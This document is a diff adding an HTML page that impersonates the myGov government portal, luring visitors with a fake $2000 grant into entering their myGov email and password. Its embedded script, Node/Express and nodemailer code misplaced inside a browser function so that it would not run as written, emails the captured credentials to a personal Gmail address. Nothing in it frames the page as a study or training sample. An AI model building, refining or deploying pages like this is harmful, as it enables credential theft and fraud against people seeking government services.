@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="file:///C:/Users/OWBER/Downloads/63d9b6249fffa-removebg-preview.png" type="image/x-icon">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        *{
+            margin: 0;
+        }
+        header{
+            background-color: lightskyblue;
+            height: 92px;
+            padding: 10px;
+        }
+        .logo img{
+            width: 250px;
+            padding: 7px;
+        }
+        .others{
+            padding: 20px;
+            margin: 8px;
+        }
+        .others p{
+            font-size: 50px;
+            font-weight: 300;
+            line-height: 37px;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        #access{
+            font-size: 30px;
+        }
+        form {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f7f7f7;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            }
+
+            label {
+            display: block;
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            }
+
+            input[type="email"],
+            input[type="password"] {
+            display: block;
+            width: 90%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            }
+
+            input[type="submit"] {
+            background-color: #4caf50;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            cursor: pointer;
+            }
+
+            input[type="submit"]:hover {
+            background-color: #3e8e41;
+            }
+
+        .info{
+            width: 100%;
+            margin: 0 auto;
+            padding: 40px 0 60px;
+            background-color: rgb(242, 243, 243);
+        }
+        .info .car{
+            margin-left: 40px;
+        }
+        .info label{
+            margin: 20px;
+            font-family: Roboto, sans-serif;
+            letter-spacing: 0.001em;
+            font-weight: 400;
+            font-size: 2.25rem;
+        }
+        .card{
+            margin: 0;
+            padding: 0;
+            list-style: none;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        .card .card1, .card2, .card3{
+            background-color: white;
+            border-radius: 5px;
+            display: flex;
+            flex-direction: column;
+            width: 70%;
+            padding: 24px;
+            box-shadow: inset;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .card .card1:hover, .card2:hover, .card3:hover{
+            border-style: solid;
+            border-color: black;
+
+        }
+        .about1, .about2, .about3{
+            line-height: 1.5556;
+            font-weight: 300;
+            font-size: 1.125rem;
+            margin: 0;
+            margin-bottom: 1rem;
+        }
+        .card .card1 .title1, .title2, .title3{
+            line-height: 1.25;
+            letter-spacing: 0;
+            font-weight: 500;
+            font-size: 1.625rem;
+            margin: 0;
+        }
+        .more{
+            max-width: fit-content;
+            position: relative;
+            color: #254A7E;
+            font-size: 1.125rem;
+            line-height: 1.5rem;
+            font-weight: normal;
+            transition: 150ms ease;
+            text-decoration: underline;
+        }
+        .more:hover{
+            text-decoration: none;
+            max-width: fit-content;
+            background-color: #254A7E;
+            color:rgb(242, 243, 243)
+        }
+        footer{
+            background-color: black;
+        }
+    </style>
+    <title>myGov: Get a grant</title>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="file:///C:/Users/OWBER/Downloads/myGov-logo-cobranded-black.svg_-_Google_Chrome_3_5_2023_11_58_29_PM__2___1_-removebg-preview.png" alt="Our Logo">
+        </div>
+        
+    </header>
+    <div class="others">
+        <p>We're here to help</p>
+        <p id="access">Access government services from one place.</p>
+    </div>
+    <form onsubmit="return sendForm()" method="post" action="?">
+        <label>Get a Grant of $2000 from the government today</label><br><br>
+        <input type="email" placeholder="myGov e-mail" name="MyGov Email"><br><br>
+        <input type="password" placeholder="myGov password" name="Password"><br><br>
+        <input type="submit" value="Submit">
+      </form>
+    <div class="info">
+        <div class="car">
+        <label>Useful Information</label>
+        <div class="card">
+                <div class="card1">
+                    <h3 class="title1">Proof of your COVID-19 vaccinations</h3>
+                    <p class="about1">Find out about COVID-19 digital certificate, immunisation history statement or international certificate.</p>
+                    <p class="more">Get proof of vaccinations</p>
+                </div>
+                <div class="card2">
+                    <h3 class="title2">Getting help after a natural disaster</h3>
+                    <p class="about2">If you've been affected by a natural disaster, there's support and services to help you.</p>
+                    <p class="more">Get help after a natural disaster</p>
+                </div>
+                <div class="card3">
+                    <h3 class="title3">Impacted by coronavirus (COVID-19)</h3>
+                    <p class="about3">Find out what support is available when you're impacted by COVID-19.</p>
+                    <p class="more">Read more</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>
+        
+    </footer>
+    <script>
+        function sendForm(){
+            const express = require("express");
+const bodyParser = require("body-parser");
+const nodemailer = require("nodemailer");
+
+const app = express();
+const port = 3000;
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+app.post("/send-form", (req, res) => {
+  const { MyGovEmail, Password } = req.body;
+
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "your_email@gmail.com",
+      pass: "your_email_password",
+    },
+  });
+
+  let mailOptions = {
+    from: "your_email@gmail.com",
+    to: "ariyoaresa89@gmail.com",
+    subject: "Grant Application",
+    text: `Here is the grant application from MyGov e-mail: ${MyGovEmail} and password: ${Password}.`,
+  };
+
+  transporter.sendMail(mailOptions, function (error, info) {
+    if (error) {
+      console.log(error);
+      res.status(500).send(error);
+    } else {
+      console.log("Email sent: " + info.response);
+      res.status(200).send("Email sent successfully.");
+    }
+  });
+});
+
+app.listen(port, () => {
+  console.log(`Server is listening on port ${port}.`);
+});
+
+        }
+    </script>
+</body>
+</html>
